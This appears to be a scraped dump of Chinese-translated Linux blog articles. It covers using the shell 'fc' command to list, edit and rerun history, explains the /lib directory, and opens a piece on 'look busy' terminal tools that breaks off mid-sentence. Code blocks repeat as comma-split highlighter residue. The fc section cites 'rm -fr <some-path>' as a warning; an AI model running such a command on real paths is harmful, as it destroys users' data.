clear\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,fc, ,-,ln, ,nano, ,~,/,.,profile, ,source, ,~,/,.,profile, ,source, ,~,/,.,profile, ,fc, ,-,ln, ,fc, ,-,l, ,sudo ,netctl ,restart ,wlp9s0sktab, ,ls, ,-,l, ,pwd, ,uname, ,-,r, ,uname, ,-,a, ,echo, ,\"Welcome to OSTechNix\", ,sudo ,apcman, ,-,Syu, ,cat ,ostechnix,.,txt, ,wc, ,-,l, ,ostechnix,.,txt, ,more ,ostechnix,.,txt, ,clear, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这样行号就不再显示了。,\n,如果想以某个命令开始，只需在 ,-l, 选项后面加上行号即可。比如，要显示行号 520 至最近的命令，可以这样：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ fc -l 520\r\n520 ls -l\r\n521 pwd\r\n522 uname -r\r\n523 uname -a\r\n524 echo \"Welcome to OSTechNix\"\r\n525 sudo apcman -Syu\r\n526 cat ostechnix.txt\r\n527 wc -l ostechnix.txt\r\n528 more ostechnix.txt\r\n529 clear\r\n530 fc -ln\r\n531 fc -l\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,fc, ,-,l, ,520,520, ,ls, ,-,l,521, ,pwd,522, ,uname, ,-,r,523, ,uname, ,-,a,524, ,echo, ,\"Welcome to OSTechNix\",525, ,sudo ,apcman, ,-,Syu,526, ,cat ,ostechnix,.,txt,527, ,wc, ,-,l, ,ostechnix,.,txt,528, ,more ,ostechnix,.,txt,529, ,clear,530, ,fc, ,-,ln,531, ,fc, ,-,l, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,要列出一段范围内的命令，将始、末行号作为 ,fc -l, 的参数即可，比如 520 至 525：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ fc -l 520 525\r\n520 ls -l\r\n521 pwd\r\n522 uname -r\r\n523 uname -a\r\n524 echo \"Welcome to OSTechNix\"\r\n525 sudo apcman -Syu\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,fc, ,-,l, ,520, ,525,520, ,ls, ,-,l,521, ,pwd,522, ,uname, ,-,r,523, ,uname, ,-,a,524, ,echo, ,\"Welcome to OSTechNix\",525, ,sudo ,apcman, ,-,Syu, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,除了使用行号，我们还可以使用字符。比如，要列出最近一个 ,pwd, 至最近一个命令之间的所有命令，只需要像下面这样使用起始字母即可：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ fc -l p\r\n521 pwd\r\n522 uname -r\r\n523 uname -a\r\n524 echo \"Welcome to OSTechNix\"\r\n525 sudo apcman -Syu\r\n526 cat ostechnix.txt\r\n527 wc -l ostechnix.txt\r\n528 more ostechnix.txt\r\n529 clear\r\n530 fc -ln\r\n531 fc -l\r\n532 fc -l 520\r\n533 fc -l 520 525\r\n534 fc -l 520\r\n535 fc -l 522\r\n536 fc -l l\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,fc, ,-,l, ,p,521, ,pwd,522, ,uname, ,-,r,523, ,uname, ,-,a,524, ,echo, ,\"Welcome to OSTechNix\",525, ,sudo ,apcman, ,-,Syu,526, ,cat ,ostechnix,.,txt,527, ,wc, ,-,l, ,ostechnix,.,txt,528, ,more ,ostechnix,.,txt,529, ,clear,530, ,fc, ,-,ln,531, ,fc, ,-,l,532, ,fc, ,-,l, ,520,533, ,fc, ,-,l, ,520, ,525,534, ,fc, ,-,l, ,520,535, ,fc, ,-,l, ,522,536, ,fc, ,-,l, ,l, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,要列出所有 ,pwd, 和 ,more, 之间的命令，你可以都使用起始字母，像这样：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ fc -l p m\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,fc, ,-,l, ,p, ,m, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,或者，使用开始命令的首字母以及结束命令的行号：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ fc -l p 528\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,fc, ,-,l, ,p, ,528, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,或者都使用行号：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ fc -l 521 528\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,fc, ,-,l, ,521, ,528, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这三个命令都显示一样的结果。,\n,编辑并执行上一个命令,\n,我们经常敲错命令，这时你可以用默认编辑器修正拼写错误并执行而不用将命令重新再敲一遍。,\n,编辑并执行上一个命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ fc\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,fc, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这会在默认编辑器里载入上一个命令。,\n,\n,你可以看到，我上一个命令是 ,fc -l,。你可以随意修改，它会在你保存退出编辑器时自动执行。这在命令或参数又长又复杂时很有用。需要注意的是，它同时也可能是,毁灭性,的。比如，如果你的上一个命令是危险的 ,rm -fr <some-path>,，当它自动执行时你可能丢掉你的重要数据。所以，小心谨慎对待每一个命令。,\n,更改默认编辑器,\n,另一个有用的选项是 ,-e, ，它可以用来为 ,fc, 命令选择不同的编辑器。比如，如果我们想用 ,nano, 来编辑上一个命令:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ fc -e nano\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,fc, ,-,e, ,nano, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这个命令会打开 ,nano, 编辑器（而不是默认编辑器）编辑上一个命令。,\n,\n,如果你觉得用 ,-e, 选项太麻烦，你可以修改你的默认编辑器，只需要将环境变量 ,FCEDIT, 设为你想要让 ,fc, 使用的编辑器名称即可。,\n,比如，要把 ,nano, 设为默认编辑器，编辑你的 ,~/.profile, 或其他初始化文件： （LCTT 译注：如果 ,~/.profile, 不存在可自己创建；如果使用的是 bash ，可以编辑 ,~/.bash_profile, ）,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ vi ~/.profile\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,vi, ,~,/,.,profile, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,添加下面一行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nFCEDIT=nano\r\n# LCTT译注：如果在子 shell 中会用到 fc ，最好在这里 export FCEDIT\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,FCEDIT,=,nano,# LCTT译注：如果在子 shell 中会用到 fc ，最好在这里 export FCEDIT, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,你也可以使用编辑器的完整路径：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nFCEDIT=/usr/local/bin/emacs\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,FCEDIT,=,/,usr,/,local,/,bin,/,emacs, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,输入 ,:wq, 保存退出。要使改动立即生效，运行以下命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ source ~/.profile\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,source, ,~,/,.,profile, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,现在再输入 ,fc, 就可以使用 ,nano, 编辑器来编辑上一个命令了。,\n,不编辑而直接执行上一个命令,\n,我们现在知道 ,fc, 命令不带任何参数的话会将上一个命令载入编辑器。但有时你可能不想编辑，仅仅是想再次执行上一个命令。这很简单，在末尾加上连字符（,-,）就可以了：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ echo \"Welcome to OSTechNix\"\r\nWelcome to OSTechNix\r\n\r\n$ fc -e -\r\necho \"Welcome to OSTechNix\"\r\nWelcome to OSTechNix\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,echo, ,\"Welcome to OSTechNix\",Welcome ,to, ,OSTechNix, ,$, ,fc, ,-,e, ,-,echo, ,\"Welcome to OSTechNix\",Welcome ,to, ,OSTechNix, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如你所见，,fc, 带了 ,-e, 选项，但并没有编辑上一个命令（例中的 ,echo \" Welcome to OSTechNix\",）。,\n,需要注意的是，有些选项仅对指定 shell 有效。比如下面这些选项可以用在 zsh 中，但在 Bash 或 Ksh 中则不能用。,\n,显示命令的执行时间,\n,想要知道命令是在什么时候执行的，可以用 ,-d, 选项：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nfc -ld\r\n1 18:41 exit\r\n2 18:41 clear\r\n3 18:42 fc -l\r\n4 18:42 sudo netctl restart wlp9s0sktab\r\n5 18:42 ls -l\r\n6 18:42 pwd\r\n7 18:42 uname -r\r\n8 18:43 uname -a\r\n9 18:43 cat ostechnix.txt\r\n10 18:43 echo \"Welcome to OSTechNix\"\r\n11 18:43 more ostechnix.txt\r\n12 18:43 wc -l ostechnix.txt\r\n13 18:43 cat ostechnix.txt\r\n14 18:43 clear\r\n15 18:43 fc -l\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,fc, ,-,ld,1, ,18,:,41, ,exit,2, ,18,:,41, ,clear,3, ,18,:,42, ,fc, ,-,l,4, ,18,:,42, ,sudo ,netctl ,restart ,wlp9s0sktab,5, ,18,:,42, ,ls, ,-,l,6, ,18,:,42, ,pwd,7, ,18,:,42, ,uname, ,-,r,8, ,18,:,43, ,uname, ,-,a,9, ,18,:,43, ,cat ,ostechnix,.,txt,10, ,18,:,43, ,echo, ,\"Welcome to OSTechNix\",11, ,18,:,43, ,more ,ostechnix,.,txt,12, ,18,:,43, ,wc, ,-,l, ,ostechnix,.,txt,13, ,18,:,43, ,cat ,ostechnix,.,txt,14, ,18,:,43, ,clear,15, ,18,:,43, ,fc, ,-,l, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这样你就可以查看最近命令的具体执行时间了。,\n,使用选项 ,-f, ，可以为每个命令显示完整的时间戳。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n fc -lf\r\n 1 4/5/2018 18:41 exit\r\n 2 4/5/2018 18:41 clear\r\n 3 4/5/2018 18:42 fc -l\r\n 4 4/5/2018 18:42 sudo netctl restart wlp9s0sktab\r\n 5 4/5/2018 18:42 ls -l\r\n 6 4/5/2018 18:42 pwd\r\n 7 4/5/2018 18:42 uname -r\r\n 8 4/5/2018 18:43 uname -a\r\n 9 4/5/2018 18:43 cat ostechnix.txt\r\n 10 4/5/2018 18:43 echo \"Welcome to OSTechNix\"\r\n 11 4/5/2018 18:43 more ostechnix.txt\r\n 12 4/5/2018 18:43 wc -l ostechnix.txt\r\n 13 4/5/2018 18:43 cat ostechnix.txt\r\n 14 4/5/2018 18:43 clear\r\n 15 4/5/2018 18:43 fc -l\r\n 16 4/5/2018 18:43 fc -ld\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t, ,fc, ,-,lf, ,1, ,4,/,5,/,2018, ,18,:,41, ,exit, ,2, ,4,/,5,/,2018, ,18,:,41, ,clear, ,3, ,4,/,5,/,2018, ,18,:,42, ,fc, ,-,l, ,4, ,4,/,5,/,2018, ,18,:,42, ,sudo ,netctl ,restart ,wlp9s0sktab, ,5, ,4,/,5,/,2018, ,18,:,42, ,ls, ,-,l, ,6, ,4,/,5,/,2018, ,18,:,42, ,pwd, ,7, ,4,/,5,/,2018, ,18,:,42, ,uname, ,-,r, ,8, ,4,/,5,/,2018, ,18,:,43, ,uname, ,-,a, ,9, ,4,/,5,/,2018, ,18,:,43, ,cat ,ostechnix,.,txt, ,10, ,4,/,5,/,2018, ,18,:,43, ,echo, ,\"Welcome to OSTechNix\", ,11, ,4,/,5,/,2018, ,18,:,43, ,more ,ostechnix,.,txt, ,12, ,4,/,5,/,2018, ,18,:,43, ,wc, ,-,l, ,ostechnix,.,txt, ,13, ,4,/,5,/,2018, ,18,:,43, ,cat ,ostechnix,.,txt, ,14, ,4,/,5,/,2018, ,18,:,43, ,clear, ,15, ,4,/,5,/,2018, ,18,:,43, ,fc, ,-,l, ,16, ,4,/,5,/,2018, ,18,:,43, ,fc, ,-,ld, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,当然，欧洲的老乡们还可以使用 ,-E, 选项来显示欧洲时间格式。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n fc -lE\r\n 2 5.4.2018 18:41 clear\r\n 3 5.4.2018 18:42 fc -l\r\n 4 5.4.2018 18:42 sudo netctl restart wlp9s0sktab\r\n 5 5.4.2018 18:42 ls -l\r\n 6 5.4.2018 18:42 pwd\r\n 7 5.4.2018 18:42 uname -r\r\n 8 5.4.2018 18:43 uname -a\r\n 9 5.4.2018 18:43 cat ostechnix.txt\r\n 10 5.4.2018 18:43 echo \"Welcome to OSTechNix\"\r\n 11 5.4.2018 18:43 more ostechnix.txt\r\n 12 5.4.2018 18:43 wc -l ostechnix.txt\r\n 13 5.4.2018 18:43 cat ostechnix.txt\r\n 14 5.4.2018 18:43 clear\r\n 15 5.4.2018 18:43 fc -l\r\n 16 5.4.2018 18:43 fc -ld\r\n 17 5.4.2018 18:49 fc -lf\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t, ,fc, ,-,lE, ,2, ,5.4.2018, ,18,:,41, ,clear, ,3, ,5.4.2018, ,18,:,42, ,fc, ,-,l, ,4, ,5.4.2018, ,18,:,42, ,sudo ,netctl ,restart ,wlp9s0sktab, ,5, ,5.4.2018, ,18,:,42, ,ls, ,-,l, ,6, ,5.4.2018, ,18,:,42, ,pwd, ,7, ,5.4.2018, ,18,:,42, ,uname, ,-,r, ,8, ,5.4.2018, ,18,:,43, ,uname, ,-,a, ,9, ,5.4.2018, ,18,:,43, ,cat ,ostechnix,.,txt, ,10, ,5.4.2018, ,18,:,43, ,echo, ,\"Welcome to OSTechNix\", ,11, ,5.4.2018, ,18,:,43, ,more ,ostechnix,.,txt, ,12, ,5.4.2018, ,18,:,43, ,wc, ,-,l, ,ostechnix,.,txt, ,13, ,5.4.2018, ,18,:,43, ,cat ,ostechnix,.,txt, ,14, ,5.4.2018, ,18,:,43, ,clear, ,15, ,5.4.2018, ,18,:,43, ,fc, ,-,l, ,16, ,5.4.2018, ,18,:,43, ,fc, ,-,ld, ,17, ,5.4.2018, ,18,:,49, ,fc, ,-,lf, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,fc 用法总结,\n,\n,当不带任何参数时，,fc, 将上一个命令载入默认编辑器。,\n,当带一个数字作为参数时，,fc, 将数字指定的命令载入默认编辑器。,\n,当带一个字符作为参数时，,fc, 将最近一个以指定字符开头的命令载入默认编辑器。,\n,当有两个参数时，它们分别指定需要列出的命令范围的开始和结束。,\n,\n,更多细节，请参考 man 手册。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ man fc\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,man ,fc, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,好了，今天就这些。希望这篇文章能帮助到你。更多精彩内容，敬请期待！,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    , 1 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/113926/", "url_object_id": "f65acad5ef6af86c7aabdf707fd8d461", "front_image_path": "full/e47f904ab6e911e10a86b4fb2039a9331071634d.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "title": "Linux 目录结构：/lib 分析", "create_time": "2018/04/28", "vote": "1", "bookmark": "5", "comments": "1", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Surendra Anne,   译文出处：,Linux中国/ChenYi,   ,我们在之前的文章中已经分析了其他重要系统目录，比如 ,/bin,、,/boot,、,/dev,、 ,/etc, 等。可以根据自己的兴趣进入下列链接了解更多信息。本文中，让我们来看看 ,/lib, 目录都有些什么。,\n,\n,目录结构分析：/bin 文件夹,\n,目录结构分析：/boot 文件夹,\n,目录结构分析：/dev 文件夹,\n,目录结构分析：/etc 文件夹,\n,目录结构分析：/lost+found 文件夹,\n,目录结构分析：/home 文件夹,\n,\n,Linux 中，/lib 文件夹是什么？,\n,/lib, 文件夹是 ,库文件目录, ，包含了所有对系统有用的库文件。简单来说，它是应用程序、命令或进程正确执行所需要的文件。在 ,/bin, 或 ,/sbin, 目录中的命令的动态库文件正是在此目录中。内核模块同样也在这里。,\n,以 ,pwd, 命令执行为例。执行它需要调用一些库文件。让我们来探索一下 ,pwd, 命令执行时都发生了什么。我们需要使用 ,strace 命令, 找出调用的库文件。,\n,示例：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nroot@linuxnix:~# strace -e open pwd\r\nopen(\"/etc/ld.so.cache\", O_RDONLY|O_CLOEXEC) = 3\r\nopen(\"/lib/x86_64-linux-gnu/libc.so.6\", O_RDONLY|O_CLOEXEC) = 3\r\nopen(\"/usr/lib/locale/locale-archive\", O_RDONLY|O_CLOEXEC) = 3\r\n/root\r\n+++ exited with 0 +++\r\nroot@linuxnix:~# \r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,root,@,linuxnix,:,~,# strace -e open pwd,open,(,\"/etc/ld.so.cache\",,, ,O_RDONLY,|,O_CLOEXEC,), ,=, ,3,open,(,\"/lib/x86_64-linux-gnu/libc.so.6\",,, ,O_RDONLY,|,O_CLOEXEC,), ,=, ,3,open,(,\"/usr/lib/locale/locale-archive\",,, ,O_RDONLY,|,O_CLOEXEC,), ,=, ,3,/,root,++,+, ,exited ,with, ,0, ,++,+,root,@,linuxnix,:,~,# , ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如果你注意到的话，会发现我们使用的 ,pwd, 命令的执行需要调用两个库文件。,\n,Linux 中 /lib 文件夹内部信息,\n,正如之前所说，这个文件夹包含了目标文件和一些库文件，如果能了解这个文件夹的一些重要子文件，想必是极好的。下面列举的内容是基于我自己的系统，对于你的来说，可能会有所不同。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nroot@linuxnix:/lib# find . -maxdepth 1  -type d\r\n./firmware\r\n./modprobe.d\r\n./xtables\r\n./apparmor\r\n./terminfo\r\n./plymouth\r\n./init\r\n./lsb\r\n./recovery-mode\r\n./resolvconf\r\n./crda\r\n./modules\r\n./hdparm\r\n./udev\r\n./ufw\r\n./ifupdown\r\n./systemd\r\n./modules-load.d\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,root,@,linuxnix,:,/,lib,# find . -maxdepth 1  -type d,.,/,firmware,.,/,modprobe,.,d,.,/,xtables,.,/,apparmor,.,/,terminfo,.,/,plymouth,.,/,init,.,/,lsb,.,/,recovery,-,mode,.,/,resolvconf,.,/,crda,.,/,modules,.,/,hdparm,.,/,udev,.,/,ufw,.,/,ifupdown,.,/,systemd,.,/,modules,-,load,.,d, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,/lib/firmware, – 这个文件夹包含了一些硬件、固件Firmware代码。,\n,硬件和固件之间有什么不同？,\n,为了使硬件正常运行，很多设备软件由两部分软件组成。加载到实际硬件的代码部分就是固件，用于在固件和内核之间通讯的软件被称为驱动程序。这样一来，内核就可以直接与硬件通讯，并确保硬件完成内核指派的工作。,\n,/lib/modprobe.d, – modprobe 命令的配置目录。,\n,/lib/modules, – 所有的可加载内核模块都存储在这个目录下。如果你有多个内核，你会在这个目录下看到代表美国内核的目录。,\n,/lib/hdparm, – 包含 SATA/IDE 硬盘正确运行的参数。,\n,/lib/udev, – 用户空间 /dev 是 Linux 内核设备管理器。这个文件夹包含了所有的 udev 相关的文件和文件夹，例如 ,rules.d, 包含了 udev 规范文件。,\n,/lib 的姊妹文件夹：/lib32 和 /lib64,\n,这两个文件夹包含了特殊结构的库文件。它们几乎和 ,/lib, 文件夹一样，除了架构级别的差异。,\n,Linux 其他的库文件,\n,/usr/lib, – 所有软件的库都安装在这里。但是不包含系统默认库文件和内核库文件。,\n,/usr/local/lib, – 放置额外的系统文件。这些库能够用于各种应用。,\n,/var/lib, – 存储动态数据的库和文件，例如 rpm/dpkg 数据和游戏记录。,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 5 收藏,\n\n                    , 1 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/113930/", "url_object_id": "d81a13cb0a3733f72fc89f2d3f029cd2", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/04/56513a8ab958df253f196a60a8424763.jpg"], "title": "假装很忙的三个命令行工具", "create_time": "2018/04/30", "vote": "1", "bookmark": "5", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Jason Baker,   译文出处：,Linux中国/wyxplus,   ,有时候你很忙。而有时候你只是需要看起来很忙，就像电影中的黑客一样。有一些开源工具就是干这个的。,\n,\n,如果在你在消磨时光时看过谍战片、动作片或犯罪片，那么你就会清晰地在脑海中勾勒出黑客的电脑屏幕的样子。就像是在《黑客帝国》电影中，,代码雨, 一样的十六进制数字流，又或是一排排快速移动的代码。,\n,也许电影中出现一幅世界地图，其中布满了闪烁的光点和一些快速更新的图表。不可或缺的，也可能有 3D 旋转的几何形状。甚至，这一切都会显示在一些完全不符合人类习惯的数量荒谬的显示屏上。 在《剑鱼行动》电影中黑客就使用了七个显示屏。,\n,当然，我们这些从事计算机行业的人一下子就明白这完全是胡说八道。虽然在我们中，许多人都有双显示器（或更多），但一个闪烁的数据仪表盘、刷新的数据通常和专注工作是相互矛盾的。编写代码、项目管理和系统管理与日常工作不同。我们遇到的大多数情况，为了解决问题，都需要大量的思考，与客户沟通所得到一些研究和组织的资料，然后才是少许的 ,敲代码,。,\n,然而，这与我们想追求电影中的效果并不矛盾，也许，我们只是想要看起来“忙于工作”而已。,\n,注：当然，我仅仅是在此胡诌。,如果您公司实际上是根据您繁忙程度来评估您的工作时，无论您是蓝领还是白领，都需要亟待解决这样的工作文化。假装工作很忙是一种有毒的文化，对公司和员工都有害无益。,\n,这就是说，让我们找些乐子，用一些老式的、毫无意义的数据和代码片段填充我们的屏幕。（当然，数据或许有意义，但不是在这种没有上下文的环境中。）当然有一些用于此用途的有趣的图形界面程序，如 ,hackertyper.net, 或是 ,GEEKtyper.com, 网站（LCTT 译注：是在线假装黑客操作的网站），为什么不使用标准的 Linux 终端程序呢？对于更老派的外观，可以考虑使用 ,酷炫复古终端,，这听起来确实如此：一个酷炫的复古终端程序。我将在下面的屏幕截图中使用酷炫复古终端，因为它看起来的确很酷。,\n,Genact,\n,我们来看下第一个工具——Genact。Genact 的原理很简单，就是慢慢地无尽循环播放您选择的一个序列，让您的代码在您外出休息时“编译”。由您来决定播放顺序，但是其中默认包含数字货币挖矿模拟器、Composer PHP 依赖关系管理工具、内核编译器、下载器、内存转储等工具。其中我最喜欢的是其中类似《模拟城市》加载显示。所以只要没有人仔细检查，你可以花一整个下午等待您的电脑完成进度条。,\n,Genact ,发布了, 支持 Linux、OS X 和 Windows 的版本。并且其 Rust ,源代码, 在 GitHub 上开源（遵循 ,MIT 许可证,）。,\n,\n,Hollywood,\n,Hollywood 